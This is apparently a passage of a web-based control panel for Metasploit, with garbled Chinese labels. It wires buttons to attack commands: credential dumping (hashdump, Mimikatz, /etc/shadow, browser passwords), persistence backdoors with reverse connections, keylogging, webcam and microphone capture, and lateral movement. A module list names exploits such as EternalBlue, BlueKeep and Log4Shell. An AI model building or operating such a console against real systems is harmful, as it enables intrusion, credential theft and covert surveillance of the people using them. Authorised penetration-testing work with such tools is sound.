                            <button onclick="quickCmd('jobs -K')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">å…³é—­æ‰€æœ‰ä»»åŠ¡</button>
                        </div>
                    </div>

                    <!-- æ•°æ®åº“å‘½ä»¤ -->
                    <div>
                        <h4 class="text-[9px] text-cyan-400 mb-1 font-bold">ğŸ’¾ æ•°æ®åº“</h4>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="quickCmd('db_status')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">æ•°æ®åº“çŠ¶æ€</button>
                            <button onclick="quickCmd('db_connect')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">è¿æ¥æ•°æ®åº“</button>
                            <button onclick="quickCmd('hosts')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">ä¸»æœºåˆ—è¡¨</button>
                            <button onclick="quickCmd('services')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">æœåŠ¡åˆ—è¡¨</button>
                            <button onclick="quickCmd('vulns')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">æ¼æ´åˆ—è¡¨</button>
                            <button onclick="quickCmd('creds')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">å‡­è¯åˆ—è¡¨</button>
                            <button onclick="quickCmd('loot')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">æˆ˜åˆ©å“</button>
                        </div>
                    </div>

                    <!-- Meterpreter å¿«æ· -->
                    <div>
                        <h4 class="text-[9px] text-red-400 mb-1 font-bold">ğŸ¯ Meterpreter</h4>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="quickCmd('use exploit/multi/handler')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">ç›‘å¬å™¨</button>
                            <button onclick="quickCmd('msfvenom -l payloads')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">è½½è·åˆ—è¡¨</button>
                        </div>
                    </div>

                    <!-- èµ„æºè„šæœ¬ -->
                    <div>
                        <h4 class="text-[9px] text-purple-400 mb-1 font-bold">ğŸ“œ èµ„æºè„šæœ¬</h4>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="quickCmd('resource ')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">è¿è¡Œè„šæœ¬</button>
                            <button onclick="quickCmd('makerc ')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">ä¿å­˜å†å²</button>
                        </div>
                    </div>

                    <!-- ç³»ç»Ÿå·¥å…· -->
                    <div>
                        <h4 class="text-[9px] text-orange-400 mb-1 font-bold">ğŸ› ï¸ ç³»ç»Ÿå·¥å…·</h4>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="quickCmd('irb')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">Rubyç»ˆç«¯</button>
                            <button onclick="quickCmd(' pry')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">Pryè°ƒè¯•</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- ä¸­é—´ï¼šç»ˆç«¯å’Œä¼šè¯ç®¡ç† -->
        <div class="flex-1 flex flex-col bg-black min-w-0">

            <!-- ä¸ŠåŠéƒ¨åˆ†ï¼šä¼šè¯/ä»»åŠ¡ç®¡ç† -->
            <div class="h-36 bg-slate-900 border-b border-slate-700 flex flex-col shrink-0">
                <div class="flex items-center px-3 py-1 border-b border-slate-800 bg-slate-800/50">
                    <div class="flex gap-3">
                        <button onclick="showTab('sessions')" id="btn-sessions" class="text-[10px] font-bold text-white border-b-2 border-red-500 pb-0.5">ä¼šè¯</button>
                        <button onclick="showTab('jobs')" id="btn-jobs" class="text-[10px] font-bold text-slate-400 hover:text-white pb-0.5">ä»»åŠ¡</button>
                    </div>
                    <div class="flex-1"></div>
                    <button onclick="refreshSessions()" class="text-[9px] bg-blue-600 hover:bg-blue-500 text-white px-2 py-0.5 rounded">åˆ·æ–°</button>
                </div>

                <!-- ä¼šè¯åˆ—è¡¨ -->
                <div id="tab-sessions" class="flex-1 overflow-y-auto">
                    <table class="w-full text-left border-collapse text-[10px]">
                        <thead class="bg-slate-800 sticky top-0">
                            <tr class="text-slate-500">
                                <th class="p-1.5 font-normal w-8">ID</th>
                                <th class="p-1.5 font-normal w-16">ç±»å‹</th>
                                <th class="p-1.5 font-normal">ç›®æ ‡</th>
                                <th class="p-1.5 font-normal w-14">ç³»ç»Ÿ</th>
                                <th class="p-1.5 font-normal w-16">æ“ä½œ</th>
                            </tr>
                        </thead>
                        <tbody id="sessionsList" class="text-slate-300">
                            <tr><td colspan="5" class="p-2 text-center text-slate-600">æš‚æ— ä¼šè¯</td></tr>
                        </tbody>
                    </table>
                </div>

                <!-- ä»»åŠ¡åˆ—è¡¨ -->
                <div id="tab-jobs" class="flex-1 overflow-y-auto hidden">
                    <table class="w-full text-left border-collapse text-[10px]">
                        <thead class="bg-slate-800 sticky top-0">
                            <tr class="text-slate-500">
                                <th class="p-1.5 font-normal w-8">ID</th>
                                <th class="p-1.5 font-normal">æ¨¡å—</th>
                                <th class="p-1.5 font-normal w-12">æ“ä½œ</th>
                            </tr>
                        </thead>
                        <tbody id="jobsList" class="text-slate-300">
                            <tr><td colspan="3" class="p-2 text-center text-slate-600">æš‚æ— ä»»åŠ¡</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- ä¸‹åŠéƒ¨åˆ†ï¼šç»ˆç«¯ -->
            <div class="flex-1 flex flex-col min-h-0">
                <div id="terminal-container" class="flex-1 overflow-y-auto p-2 terminal-font text-xs text-slate-300 leading-relaxed bg-black"
                     onclick="document.getElementById('cmdInput').focus()">
                    <div id="output" class="whitespace-pre-wrap pb-8"></div>
                </div>

                <!-- å‘½ä»¤è¾“å…¥ -->
                <div class="p-1.5 bg-slate-900 border-t border-slate-800 flex items-center gap-2">
                    <span class="text-red-500 font-bold text-xs">msf6 ></span>
                    <input type="text" id="cmdInput"
                           class="bg-transparent border-none outline-none flex-1 text-slate-200 text-xs placeholder-slate-600 font-mono"
                           placeholder="è¾“å…¥å‘½ä»¤..." autocomplete="off">
                    <button onclick="sendCommand()" class="text-[10px] bg-red-600 hover:bg-red-700 text-white px-2 py-1 rounded">å‘é€</button>
                </div>
            </div>
        </div>

        <!-- å³ä¾§ï¼šä¼šè¯æ“ä½œä¾§è¾¹æ  -->
        <div id="sessionSidebar" class="w-72 bg-slate-800 border-l border-slate-700 flex flex-col overflow-hidden shrink-0 transition-all duration-300 sidebar-collapsed">

            <!-- ä¾§è¾¹æ å¤´éƒ¨ -->
            <div class="bg-slate-900 border-b border-slate-700 p-2 flex justify-between items-center">
                <div class="flex items-center gap-2">
                    <div id="sidebarOsIcon" class="text-lg">ğŸ’»</div>
                    <div>
                        <div id="sidebarTitle" class="text-xs font-bold text-slate-200">ä¼šè¯æ§åˆ¶å°</div>
                        <div id="sidebarSubtitle" class="text-[9px] text-slate-500">é€‰æ‹©ä¸€ä¸ªä¼šè¯</div>
                    </div>
                </div>
                <button onclick="toggleSidebar()" class="text-slate-500 hover:text-white text-xs">âœ•</button>
            </div>

            <!-- ä¼šè¯ä¿¡æ¯ -->
            <div id="sessionInfo" class="p-2 border-b border-slate-700 hidden">
                <h3 class="text-[10px] font-bold text-cyan-400 mb-2">ğŸ“Š ç³»ç»Ÿä¿¡æ¯</h3>
                <div id="sysInfoContent" class="space-y-1 text-[9px]">
                    <!-- åŠ¨æ€å¡«å…… -->
                </div>
                <button onclick="refreshSysInfo()" class="w-full mt-2 text-[9px] bg-slate-700 hover:bg-slate-600 text-slate-300 py-1 rounded">åˆ·æ–°ä¿¡æ¯</button>
            </div>

            <!-- å¿«æ·æ“ä½œ -->
            <div id="quickActions" class="flex-1 overflow-y-auto">
                <!-- æ— ä¼šè¯æç¤º -->
                <div id="noSessionHint" class="p-4 text-center text-slate-600 text-[10px]">
                    <div class="text-2xl mb-2">ğŸ”—</div>
                    <p>è¯·ä»ä¼šè¯åˆ—è¡¨ä¸­é€‰æ‹©ä¸€ä¸ªä¼šè¯</p>
                    <p class="text-slate-700 mt-1">æˆ–å»ºç«‹æ–°è¿æ¥</p>
                </div>

                <!-- Windows æ“ä½œ -->
                <div id="windowsActions" class="hidden">
                    <div class="sidebar-section p-2">
                        <h3 class="text-[10px] font-bold text-blue-400 mb-2">ğŸªŸ åŸºç¡€ä¿¡æ¯</h3>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="sessionCmd('sysinfo')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ç³»ç»Ÿä¿¡æ¯</button>
                            <button onclick="sessionCmd('getuid')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">å½“å‰ç”¨æˆ·</button>
                            <button onclick="sessionCmd('getpid')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">è¿›ç¨‹ID</button>
                            <button onclick="sessionCmd('ps')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">è¿›ç¨‹åˆ—è¡¨</button>
                        </div>
                    </div>

                    <div class="sidebar-section p-2">
                        <h3 class="text-[10px] font-bold text-yellow-400 mb-2">âš¡ æƒé™æå‡</h3>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="sessionCmd('getsystem', true)" class="action-btn text-[9px] bg-yellow-900/50 hover:bg-yellow-800 p-1.5 rounded text-yellow-300">GetSystem</button>
                            <button onclick="sessionCmd('run post/multi/recon/local_exploit_suggester', true)" class="action-btn text-[9px] bg-yellow-900/50 hover:bg-yellow-800 p-1.5 rounded text-yellow-300">ææƒå»ºè®®</button>
                            <button onclick="sessionCmd('run post/windows/gather/enum_patches', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">è¡¥ä¸ä¿¡æ¯</button>
                            <button onclick="sessionCmd('run post/windows/gather/enum_services', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">æœåŠ¡åˆ—è¡¨</button>
                        </div>
                    </div>

                    <div class="sidebar-section p-2">
                        <h3 class="text-[10px] font-bold text-red-400 mb-2">ğŸ” å‡­è¯æ”¶é›†</h3>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="sessionCmd('run post/windows/gather/smart_hashdump', true)" class="action-btn text-[9px] bg-red-900/50 hover:bg-red-800 p-1.5 rounded text-red-300">HashDump</button>
                            <button onclick="sessionCmd('run post/windows/gather/credentials/gpp', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">GPPå¯†ç </button>
                            <button onclick="sessionCmd('load kiwi', true)" class="action-btn text-[9px] bg-red-900/50 hover:bg-red-800 p-1.5 rounded text-red-300">Mimikatz</button>
                            <button onclick="sessionCmd('run post/windows/gather/enum_chrome', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">Chrome</button>
                            <button onclick="sessionCmd('run post/windows/gather/enum_firefox', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">Firefox</button>
                            <button onclick="sessionCmd('run post/windows/gather/enum_terms', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ç»ˆç«¯å‡­è¯</button>
                        </div>
                    </div>

                    <div class="sidebar-section p-2">
                        <h3 class="text-[10px] font-bold text-green-400 mb-2">ğŸ”§ æƒé™ç»´æŒ</h3>
                        <div class="grid grid-cols-1 gap-1">
                            <button onclick="sessionCmd('run persistence -U -i 10 -p 4445 -r ' + (document.getElementById('lhost')?.value || '0.0.0.0'), true)" class="action-btn text-[9px] bg-green-900/50 hover:bg-green-800 p-1.5 rounded text-green-300 text-left">Persistence</button>
                            <button onclick="sessionCmd('run post/windows/manage/persistence', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded text-left">æŒä¹…åŒ–æ¨¡å—</button>
                            <button onclick="sessionCmd('run post/windows/manage/install_msi', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded text-left">MSI åé—¨</button>
                            <button onclick="sessionCmd('run scheduleme', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded text-left">è®¡åˆ’ä»»åŠ¡</button>
                        </div>
                    </div>

                    <div class="sidebar-section p-2">
                        <h3 class="text-[10px] font-bold text-purple-400 mb-2">ğŸŒ æ¨ªå‘ç§»åŠ¨</h3>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="sessionCmd('run autoroute', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">è‡ªåŠ¨è·¯ç”±</button>
                            <button onclick="sessionCmd('run post/multi/gather/ping_sweep', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ç½‘æ®µæ¢æµ‹</button>
                            <button onclick="sessionCmd('run post/windows/gather/enum_ad_users', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">åŸŸç”¨æˆ·</button>
                            <button onclick="sessionCmd('run post/windows/gather/enum_ad_computers', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">åŸŸè®¡ç®—æœº</button>
                        </div>
                    </div>

                    <div class="sidebar-section p-2">
                        <h3 class="text-[10px] font-bold text-cyan-400 mb-2">ğŸ“ æ–‡ä»¶æ“ä½œ</h3>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="sessionCmd('pwd')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">å½“å‰ç›®å½•</button>
                            <button onclick="sessionCmd('ls')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">æ–‡ä»¶åˆ—è¡¨</button>
                            <button onclick="sessionCmd('cd ..')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ä¸Šçº§ç›®å½•</button>
                            <button onclick="sessionCmd('download ', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ä¸‹è½½æ–‡ä»¶</button>
                            <button onclick="sessionCmd('upload ', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ä¸Šä¼ æ–‡ä»¶</button>
                            <button onclick="sessionCmd('edit ', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ç¼–è¾‘æ–‡ä»¶</button>
                        </div>
                    </div>

                    <div class="sidebar-section p-2">
                        <h3 class="text-[10px] font-bold text-pink-400 mb-2">ğŸ‘€ ç›‘æ§åŠŸèƒ½</h3>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="sessionCmd('screenshot')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">æˆªå±</button>
                            <button onclick="sessionCmd('keyscan_start', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">é”®ç›˜è®°å½•</button>
                            <button onclick="sessionCmd('keyscan_dump', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">å¯¼å‡ºè®°å½•</button>
                            <button onclick="sessionCmd('webcam_list', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">æ‘„åƒå¤´</button>
                            <button onclick="sessionCmd('record_mic', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">å½•éŸ³</button>
                            <button onclick="sessionCmd('enumdesktops', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">æ¡Œé¢åˆ—è¡¨</button>
                        </div>
                    </div>

                    <div class="sidebar-section p-2">
                        <h3 class="text-[10px] font-bold text-orange-400 mb-2">ğŸ”Œ ç½‘ç»œå·¥å…·</h3>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="sessionCmd('ipconfig')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ç½‘ç»œé…ç½®</button>
                            <button onclick="sessionCmd('netstat')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ç½‘ç»œè¿æ¥</button>
                            <button onclick="sessionCmd('route')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">è·¯ç”±è¡¨</button>
                            <button onclick="sessionCmd('arp', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ARPè¡¨</button>
                            <button onclick="sessionCmd('portfwd add -l 3389 -p 3389 -r 127.0.0.1', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ç«¯å£è½¬å‘</button>
                            <button onclick="sessionCmd('run get_local_subnets', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">æœ¬åœ°ç½‘æ®µ</button>
                        </div>
                    </div>
                </div>

                <!-- Linux æ“ä½œ -->
                <div id="linuxActions" class="hidden">
                    <div class="sidebar-section p-2">
                        <h3 class="text-[10px] font-bold text-yellow-400 mb-2">ğŸ§ åŸºç¡€ä¿¡æ¯</h3>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="sessionCmd('sysinfo')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ç³»ç»Ÿä¿¡æ¯</button>
                            <button onclick="sessionCmd('getuid')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">å½“å‰ç”¨æˆ·</button>
                            <button onclick="sessionCmd('execute -f id', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">IDä¿¡æ¯</button>
                            <button onclick="sessionCmd('execute -f uname -a', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">å†…æ ¸ç‰ˆæœ¬</button>
                        </div>
                    </div>

                    <div class="sidebar-section p-2">
                        <h3 class="text-[10px] font-bold text-yellow-400 mb-2">âš¡ æƒé™æå‡</h3>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="sessionCmd('run post/multi/recon/local_exploit_suggester', true)" class="action-btn text-[9px] bg-yellow-900/50 hover:bg-yellow-800 p-1.5 rounded text-yellow-300">ææƒå»ºè®®</button>
                            <button onclick="sessionCmd('execute -f sudo -l', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">Sudoæƒé™</button>
                            <button onclick="sessionCmd('run post/linux/gather/enum_system', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ç³»ç»Ÿæšä¸¾</button>
                            <button onclick="sessionCmd('execute -f find -a \'/\' -perm -4000 2>/dev/null', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">SUIDæ–‡ä»¶</button>
                            <button onclick="sessionCmd('execute -f cat -a /etc/sudoers', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">Sudoers</button>
                            <button onclick="sessionCmd('execute -f capsh -a --print', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">Capabilities</button>
                        </div>
                    </div>

                    <div class="sidebar-section p-2">
                        <h3 class="text-[10px] font-bold text-green-400 mb-2">ğŸ”§ æƒé™ç»´æŒ</h3>
                        <div class="grid grid-cols-1 gap-1">
                            <button onclick="sessionCmd('run persistence -U -i 10 -p 4445 -r ' + (document.getElementById('lhost')?.value || '0.0.0.0'), true)" class="action-btn text-[9px] bg-green-900/50 hover:bg-green-800 p-1.5 rounded text-green-300 text-left">Persistence</button>
                            <button onclick="sessionCmd('run post/linux/manage/sshkey_persistence', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded text-left">SSH Keyåé—¨</button>
                            <button onclick="sessionCmd('execute -f crontab -a -l', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded text-left">è®¡åˆ’ä»»åŠ¡</button>
                            <button onclick="sessionCmd('execute -f cat -a ~/.ssh/authorized_keys', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded text-left">SSHå…¬é’¥</button>
                        </div>
                    </div>

                    <div class="sidebar-section p-2">
                        <h3 class="text-[10px] font-bold text-red-400 mb-2">ğŸ” å‡­è¯æ”¶é›†</h3>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="sessionCmd('run post/linux/gather/hashdump', true)" class="action-btn text-[9px] bg-red-900/50 hover:bg-red-800 p-1.5 rounded text-red-300">HashDump</button>
                            <button onclick="sessionCmd('run post/multi/gather/ssh_creds', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">SSHå‡­è¯</button>
                            <button onclick="sessionCmd('execute -f cat -a /etc/shadow', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">Shadow</button>
                            <button onclick="sessionCmd('execute -f cat -a /etc/passwd', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">Passwd</button>
                            <button onclick="sessionCmd('run post/linux/gather/enum_network', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ç½‘ç»œå‡­è¯</button>
                            <button onclick="sessionCmd('execute -f history', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">å‘½ä»¤å†å²</button>
                        </div>
                    </div>

                    <div class="sidebar-section p-2">
                        <h3 class="text-[10px] font-bold text-cyan-400 mb-2">ğŸ“ æ–‡ä»¶æ“ä½œ</h3>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="sessionCmd('pwd')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">å½“å‰ç›®å½•</button>
                            <button onclick="sessionCmd('ls -la', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">æ–‡ä»¶åˆ—è¡¨</button>
                            <button onclick="sessionCmd('cd ..')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ä¸Šçº§ç›®å½•</button>
                            <button onclick="sessionCmd('shell', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">äº¤äº’Shell</button>
                            <button onclick="sessionCmd('download ', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ä¸‹è½½æ–‡ä»¶</button>
                            <button onclick="sessionCmd('upload ', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ä¸Šä¼ æ–‡ä»¶</button>
                        </div>
                    </div>

                    <div class="sidebar-section p-2">
                        <h3 class="text-[10px] font-bold text-purple-400 mb-2">ğŸŒ ç½‘ç»œæ“ä½œ</h3>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="sessionCmd('run autoroute', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">è‡ªåŠ¨è·¯ç”±</button>
                            <button onclick="sessionCmd('portfwd add -l 3389 -p 3389 -r 127.0.0.1', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ç«¯å£è½¬å‘</button>
                            <button onclick="sessionCmd('execute -f ifconfig', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ç½‘ç»œé…ç½®</button>
                            <button onclick="sessionCmd('execute -f netstat -a -tunlp', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ç½‘ç»œè¿æ¥</button>
                            <button onclick="sessionCmd('execute -f ip -a route', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">è·¯ç”±è¡¨</button>
                            <button onclick="sessionCmd('execute -f arp -a -a', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ARPè¡¨</button>
                        </div>
                    </div>

                    <div class="sidebar-section p-2">
                        <h3 class="text-[10px] font-bold text-orange-400 mb-2">ğŸ” ä¿¡æ¯æ”¶é›†</h3>
                        <div class="grid grid-cols-2 gap-1">
                            <button onclick="sessionCmd('execute -f cat -a /proc/version', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ç³»ç»Ÿç‰ˆæœ¬</button>
                            <button onclick="sessionCmd('execute -f env', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ç¯å¢ƒå˜é‡</button>
                            <button onclick="sessionCmd('execute -f ps -a aux', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">è¿›ç¨‹åˆ—è¡¨</button>
                            <button onclick="sessionCmd('execute -f last', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ç™»å½•å†å²</button>
                        </div>
                    </div>
                </div>

                <!-- é€šç”¨æ“ä½œ -->
                <div id="commonActions" class="sidebar-section p-2 hidden">
                    <h3 class="text-[10px] font-bold text-slate-400 mb-2">âš™ï¸ ä¼šè¯ç®¡ç†</h3>
                    <div class="grid grid-cols-2 gap-1">
                        <button onclick="enterSessionMode()" class="action-btn text-[9px] bg-green-900/50 hover:bg-green-800 p-1.5 rounded text-green-300">è¿›å…¥äº¤äº’</button>
                        <button onclick="backgroundSession()" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">åå°è¿è¡Œ</button>
                        <button onclick="sessionCmd('migrate', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">è¿›ç¨‹è¿ç§»</button>
                        <button onclick="killCurrentSession()" class="action-btn text-[9px] bg-red-900/50 hover:bg-red-800 p-1.5 rounded text-red-300">å…³é—­ä¼šè¯</button>
                    </div>
                    <div class="mt-2 grid grid-cols-1 gap-1">
                        <button onclick="sessionCmd('run post/multi/manage/system_session', true)" class="action-btn text-[9px] bg-purple-900/50 hover:bg-purple-800 p-1.5 rounded text-purple-300 text-left">åˆ›å»ºç³»ç»ŸShell</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- é€»è¾‘è„šæœ¬ -->
    <script>
        const socket = io();
        const output = document.getElementById('output');
        const cmdInput = document.getElementById('cmdInput');
        const container = document.getElementById('terminal-container');
        const statusEl = document.getElementById('msfStatus');
        const sessionCountEl = document.getElementById('sessionCount');

        let isRefreshing = false;
        let refreshType = '';
        let buffer = "";
        let currentSessionId = null;
        let currentSessionOs = null;
        let sessions = {};
        let sidebarOpen = false;
        let inSessionMode = false;  // è·Ÿè¸ªæ˜¯å¦åœ¨ä¼šè¯äº¤äº’æ¨¡å¼ä¸­

        const modules = {
            // çƒ­é—¨æ¼æ´åˆ©ç”¨
            'ms17_010': { path: 'exploit/windows/smb/ms17_010_eternalblue', desc: 'MS17-010 EternalBlue - åˆ©ç”¨SMBæ¼æ´è¿œç¨‹æ‰§è¡Œä»£ç ', needPayload: true },
            'bluekeep': { path: 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce', desc: 'CVE-2019-0708 BlueKeep - RDPè¿œç¨‹ä»£ç æ‰§è¡Œ', needPayload: true },
            'netapi': { path: 'exploit/windows/smb/ms08_067_netapi', desc: 'MS08-067 NetAPI - è€ç‰ˆæœ¬Windows SMBæ¼æ´', needPayload: true },
            'psexec': { path: 'exploit/windows/smb/psexec', desc: 'PsExec - é€šè¿‡SMBæ‰§è¡Œå‘½ä»¤(éœ€è¦å‡­è¯)', needPayload: true },
            'wmi': { path: 'exploit/windows/wmi/wmi_event_consumer', desc: 'WMIäº‹ä»¶è®¢é˜… - æ¨ªå‘ç§»åŠ¨', needPayload: true },
            'winrm': { path: 'exploit/windows/winrm/winrm_script_exec', desc: 'WinRMè„šæœ¬æ‰§è¡Œ - æ¨ªå‘ç§»åŠ¨', needPayload: true },

            // PHP æ¼æ´
            'php_cgi_argi': { path: 'exploit/multi/http/php_cgi_arg_injection', desc: 'PHP CGIå‚æ•°æ³¨å…¥ - è¿œç¨‹ä»£ç æ‰§è¡Œ', needPayload: true },
            'php_include': { path: 'exploit/multi/http/php_include', desc: 'PHPæ–‡ä»¶åŒ…å« - é€šç”¨åˆ©ç”¨', needPayload: true },
            'phpmeterpreter': { path: 'exploit/multi/http/phpmeterpreter', desc: 'PHP Meterpreter - é€šç”¨PHPåˆ©ç”¨', needPayload: true },
            'thinkphp_rce': { path: 'exploit/unix/webapp/thinkphp_rce', desc: 'ThinkPHP 5.x è¿œç¨‹ä»£ç æ‰§è¡Œ', needPayload: true },
            'thinkphp_rce2': { path: 'exploit/unix/webapp/thinkphp_rce_2019', desc: 'ThinkPHP 5.0.23 RCE', needPayload: true },
            'laravel_rce': { path: 'exploit/unix/webapp/laravel_ignition_rce', desc: 'Laravel Ignition CVE-2021-3129', needPayload: true },
            'phpunit_rce': { path: 'exploit/unix/webapp/phpunit_eval', desc: 'PHPUnit evalä»£ç æ‰§è¡Œ', needPayload: true },
            'phpmailer_rce': { path: 'exploit/multi/http/phpmailer_arg_injection', desc: 'PHPMailerå‚æ•°æ³¨å…¥RCE', needPayload: true },

            // Java æ¼æ´
            'log4j_rce': { path: 'exploit/multi/http/log4shell_header_injection', desc: 'Log4j (Log4Shell) CVE-2021-44228', needPayload: true },
            'spring4shell': { path: 'exploit/multi/http/spring4shell', desc: 'Spring4Shell CVE-2022-22965', needPayload: true },
